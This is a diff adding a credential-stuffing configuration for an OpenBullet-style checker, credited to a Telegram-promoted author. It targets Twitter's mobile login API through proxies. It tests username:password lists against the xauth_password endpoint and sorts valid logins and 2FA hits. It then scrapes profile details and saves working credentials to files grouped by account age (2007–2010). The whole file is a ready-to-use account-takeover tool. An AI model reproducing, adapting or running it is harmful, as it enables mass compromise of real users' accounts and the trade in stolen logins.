@@ -1,0 +1,192 @@
+[SETTINGS]
+{
+  "Name": "Twitter",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-03T22:06:40.6823814+02:00",
+  "AdditionalInfo": "t.me/KaraczTM",
+  "Author": "@KingKaracz",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#R1 FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "R1" 
+
+#R2 FUNCTION GenerateGUID -> VAR "R2" 
+
+REQUEST POST "https://api.twitter.com/oauth2/token" 
+  CONTENT "grant_type=client_credentials" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Cache-Control: no-store" 
+  HEADER "X-B3-TraceId: <R1>" 
+  HEADER "OS-Security-Patch-Level: 2017-10-05" 
+  HEADER "X-Twitter-Client-Flavor: " 
+  HEADER "User-Agent: TwitterAndroid/8.95.0-release.00 (28950000-r-0) A5010/7.1.2 (OnePlus;A5010;OnePlus;A5010;0;;1;2013)" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Twitter-Client-AdID: <R2>" 
+  HEADER "Timezone: Asia/Shanghai" 
+  HEADER "X-Twitter-Client-Limit-Ad-Tracking: 0" 
+  HEADER "X-Twitter-Client: TwitterAndroid" 
+  HEADER "X-Twitter-Client-Language: en-US" 
+  HEADER "X-Twitter-Client-DeviceID: <R1>" 
+  HEADER "X-Twitter-API-Version: 5" 
+  HEADER "Optimize-Body: true" 
+  HEADER "X-Twitter-Active-User: no" 
+  HEADER "X-Twitter-Client-Version: 8.95.0-release.00" 
+  HEADER "X-Client-UUID: <R2>" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Basic M25WdVNvQlpueDZVNHZ6VXhmNXc6QmNzNTlFRmJic2RGNlNsOU5nNzFzbWdTdFdFR3dYWEtTall2UFZ0N3F5cw==" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Host: api.twitter.com" 
+  HEADER "Connection: keep-alive" 
+
+#R3 PARSE "<SOURCE>" JSON "access_token" -> VAR "R3" 
+
+REQUEST POST "https://api.twitter.com/1.1/guest/activate.json" 
+  CONTENT "" 
+  CONTENTTYPE "text/plain" 
+  HEADER "Cache-Control: no-store" 
+  HEADER "X-B3-TraceId: <R1>" 
+  HEADER "OS-Security-Patch-Level: 2017-10-05" 
+  HEADER "X-Twitter-Client-Flavor: " 
+  HEADER "User-Agent: TwitterAndroid/8.95.0-release.00 (28950000-r-0) A5010/7.1.2 (OnePlus;A5010;OnePlus;A5010;0;;1;2013)" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Twitter-Client-AdID: <R2>" 
+  HEADER "Timezone: Asia/Shanghai" 
+  HEADER "X-Twitter-Client-Limit-Ad-Tracking: 0" 
+  HEADER "X-Twitter-Client: TwitterAndroid" 
+  HEADER "X-Twitter-Client-Language: en-US" 
+  HEADER "X-Twitter-Client-DeviceID: <R1>" 
+  HEADER "X-Twitter-API-Version: 5" 
+  HEADER "Optimize-Body: true" 
+  HEADER "X-Twitter-Active-User: no" 
+  HEADER "X-Twitter-Client-Version: 8.95.0-release.00" 
+  HEADER "X-Client-UUID: <R2>" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <R3>" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Host: api.twitter.com" 
+  HEADER "Connection: keep-alive" 
+
+#R4 PARSE "<SOURCE>" JSON "guest_token" -> VAR "R4" 
+
+REQUEST POST "https://api.twitter.com/auth/1/xauth_password.json" 
+  CONTENT "x_auth_identifier=<USER>&x_auth_password=<PASS>&send_error_codes=true&x_auth_login_challenge=1&x_auth_login_verification=1&ui_metrics=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Cache-Control: no-store" 
+  HEADER "X-B3-TraceId: <R1>" 
+  HEADER "OS-Security-Patch-Level: 2017-10-05" 
+  HEADER "X-Twitter-Client-Flavor: " 
+  HEADER "User-Agent: TwitterAndroid/8.95.0-release.00 (28950000-r-0) A5010/7.1.2 (OnePlus;A5010;OnePlus;A5010;0;;1;2013)" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Twitter-Client-AdID: <R2>" 
+  HEADER "Timezone: Asia/Shanghai" 
+  HEADER "X-Twitter-Client-Limit-Ad-Tracking: 0" 
+  HEADER "X-Twitter-Client: TwitterAndroid" 
+  HEADER "X-Twitter-Client-Language: en-US" 
+  HEADER "X-Twitter-Client-DeviceID: <R1>" 
+  HEADER "X-Twitter-API-Version: 5" 
+  HEADER "Optimize-Body: true" 
+  HEADER "X-Twitter-Active-User: yes" 
+  HEADER "X-Twitter-Client-Version: 8.95.0-release.00" 
+  HEADER "X-Guest-Token: <R4>" 
+  HEADER "X-Client-UUID: <R2>" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <R3>" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Host: api.twitter.com" 
+  HEADER "Connection: keep-alive" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Could not authenticate you" 
+    KEY "x_auth_identifier parameter is missing" 
+    KEY "auth_password parameter is missing" 
+  KEYCHAIN Success OR 
+    KEY "oauth_token" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "login_verification_request_id" 
+
+#Username PARSE "<SOURCE>" LR "screen_name\":\"" "\"" CreateEmpty=FALSE -> CAP "Username" 
+
+REQUEST GET "https://api.twitter.com/graphql/P8ph10GzBbdMqWZxulqCfA/UserByScreenName?variables=%7B%22screen_name%22%3A%22<Username>%22%2C%22withHighlightedLabel%22%3Atrue%7D" 
+  
+  HEADER "authorization: Bearer <R3>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "User has been suspended" 
+
+#Account_Name PARSE "<SOURCE>" LR "name\":\"" "\"" CreateEmpty=FALSE -> CAP "Account Name" 
+
+#Joined_On PARSE "<SOURCE>" LR "created_at\":\"" "\"" CreateEmpty=FALSE -> CAP "Joined On" 
+
+#Following PARSE "<SOURCE>" LR "friends_count\":" ",\"" CreateEmpty=FALSE -> CAP "Following" 
+
+#Followers PARSE "<SOURCE>" LR "\"followers_count\":" ",\"" CreateEmpty=FALSE -> CAP "Followers" 
+
+#Credit FUNCTION Constant "@KingKaracz" -> CAP "Config By" 
+
+IF "<Joined On>" Contains "2007"
+
+#2007 UTILITY File "2007.txt" AppendLines "<USER>:<PASS> | Username : <Username> | Account Name : <Account Name> | Joined On : <Joined On> | Following : <Following> | Followers : <Followers> | Config By : @KingKaracz - Telegram Channel : @KaraczTM" 
+
+ELSE
+IF "<Joined On>" Contains "2008"
+
+#2008 UTILITY File "2008.txt" AppendLines "<USER>:<PASS> | Username : <Username> | Account Name : <Account Name> | Joined On : <Joined On> | Following : <Following> | Followers : <Followers> | Config By : @KingKaracz - Telegram Channel : @KaraczTM" 
+
+ELSE
+IF "<Joined On>" Contains "2009"
+
+#2009 UTILITY File "2009.txt" AppendLines "<USER>:<PASS> | Username : <Username> | Account Name : <Account Name> | Joined On : <Joined On> | Following : <Following> | Followers : <Followers> | Config By : @KingKaracz - Telegram Channel : @KaraczTM" 
+
+ELSE
+IF "<Joined On>" Contains "2010"
+
+#2010 UTILITY File "2010.txt" AppendLines "<USER>:<PASS> | Username : <Username> | Account Name : <Account Name> | Joined On : <Joined On> | Following : <Following> | Followers : <Followers> | Config By : @KingKaracz - Telegram Channel : @KaraczTM" 
+
+ENDIF
+
+UTILITY File "Twitter Hits.txt" AppendLines "<USER>:<PASS> | Username : <Username> | Account Name : <Account Name> | Joined On : <Joined On> | Following : <Following> | Followers : <Followers> | Config By : @KingKaracz - Telegram Channel : @KaraczTM" 
+
